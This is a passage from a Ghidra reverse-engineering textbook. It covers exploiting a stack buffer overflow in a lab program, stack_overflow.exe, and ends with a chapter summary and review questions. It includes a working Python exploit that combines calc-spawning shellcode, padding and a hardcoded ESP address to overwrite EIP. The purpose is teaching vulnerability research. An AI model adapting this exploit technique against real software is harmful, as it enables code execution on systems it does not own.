			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.20 – Analyzing the shellcode</p>&#13;
			<p>The chosen strategy to execute the shellcode, in this case, will be the following:</p>&#13;
			<ol>&#13;
				<li value="1">Put the shellcode at the beginning, letting it be at the top of the stack, which is pointed to by the <code>ESP</code> register. We know the value of <code>ESP</code> because we see it in the debugger, <code>0x0028FA08</code> (we have to put the value in reverse order due to the endianness and also can omit the byte zero).</li>&#13;
				<li>Next, add the padding in order to trigger the stack overflow, and after, let's place the value of <code>ESP</code> because <code>EIP</code> will be overwritten with this value, triggering the execution of our shellcode.</li>&#13;
			</ol>&#13;
			<p>The following code <a id="_idIndexMarker316"/>implements the aforementioned strategy:</p>&#13;
			<pre>import subprocess</pre>&#13;
			<pre>shellcode = \</pre>&#13;
			<pre>"\x31\xC0\x50\x68\x63\x61\x6C\x63\x54\x59\x50\x40\x92\x74" \</pre>&#13;
			<pre>"\x15\x51\x64\x8B\x72\x2F\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B" \ "\x30\x8B\x7E\x18\xB2\x50\xEB\x1A\xB2\x60\x48\x29\xD4\x65" \</pre>&#13;
			<pre>"\x48\x8B\x32\x48\x8B\x76\x18\x48\x8B\x76\x10\x48\xAD\x48" \ "\x8B\x30\x48\x8B\x7E\x30\x03\x57\x3C\x8B\x5C\x17\x28\x8B" \</pre>&#13;
			<pre>"\x74\x1F\x20\x48\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17" \ "\x8D\x52\x02\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xEF\x8B" \</pre>&#13;
			<pre>"\x74\x1F\x1C\x48\x01\xFE\x8B\x34\xAE\x48\x01\xF7\x99\xFF" \</pre>&#13;
			<pre>"\xD7"</pre>&#13;
			<pre>ESP = "\x08\xfa\x28"</pre>&#13;
			<pre>payload = shellcode</pre>&#13;
			<pre>payload += "A"*(212 -4 -len(shellcode))</pre>&#13;
			<pre>payload += "B"*4</pre>&#13;
			<pre>payload += ESP</pre>&#13;
			<pre>subprocess.call(["stack_overflow.exe ", payload])</pre>&#13;
			<p>Finally, let's execute the exploit and see what happens:</p>&#13;
			<p>&#13;
				<div>&#13;
					<img src="img/B16207_08_021.jpg" alt="Figure 8.21 – Executing the exploit&#13;&#10;"/>&#13;
				</p>&#13;
			</div>&#13;
			<p class="figure-caption"> </p>&#13;
			<p class="figure-caption">Figure 8.21 – Executing the exploit</p>&#13;
			<p>It works as expected. The<a id="_idIndexMarker317"/> calculator was successfully spawned.</p>&#13;
			<h1 id="_idParaDest-123"><a id="_idTextAnchor152"/>Summary</h1>&#13;
			<p>In this chapter, you learned how to use Ghidra to manually analyze program binaries to find bugs. We started by talking about memory corruption vulnerabilities. Next, we talked about how to find them and how to exploit them.</p>&#13;
			<p>You learned how to look for vulnerabilities in both source code and assembly code. Finally, you learned how to develop a simple stack-based overflow exploit and how to dump shellcode to disk in order to analyze it.</p>&#13;
			<p>The knowledge acquired in this chapter will allow you to look for software vulnerabilities even if the source code is not available. After identifying a vulnerability, you will be able to exploit it. On the other hand, when using exploits developed by a third party, you will be able to understand them and decide whether it is safe to execute the exploit or not by analyzing the shellcode. </p>&#13;
			<p>In the next chapter of this book, we will cover scripting a binary audit using Ghidra. You will learn the power of PCode intermediate representation, a very important feature of Ghidra that makes the tool different from its competitors.</p>&#13;
			<h1 id="_idParaDest-124"><a id="_idTextAnchor153"/>Questions</h1>&#13;
			<ol>&#13;
				<li value="1">Is memory corruption a unique type of software vulnerability? State some types of memory corruption vulnerability not covered here and explain them.</li>&#13;
				<li>Why is <code>strcpy</code> considered an unsafe function?</li>&#13;
				<li>State three binary protection methods that prevent memory corruption exploitation. Is it impossible to exploit software when it's protected with these mechanisms?</li>&#13;
			</ol>&#13;
			<h1 id="_idParaDest-125"><a id="_idTextAnchor154"/>Further reading</h1>&#13;
			<ul>&#13;
				<li>You can refer to <em class="italic">Penetration Testing with Shellcode</em>, <em class="italic">Hamza Megahed</em>,  <em class="italic">February 2018</em> for more information on topics covered in this chapter: <a href="https://www.packtpub.com/eu/networking-and-servers/penetration-testing-shellcode">https://www.packtpub.com/eu/networking-and-servers/penetration-testing-shellcode</a></li>&#13;
				<li><strong class="bold">Common Weakness Enumeration</strong> (<strong class="bold">CWE</strong>). CWE-14: Compiler Removal of Code to Clear Buffers. <a href="https://cwe.mitre.org/data/definitions/14.html">https://cwe.mitre.org/data/definitions/14.html</a></li>&#13;
			</ul>&#13;
		</div>&#13;
	</div></body></html>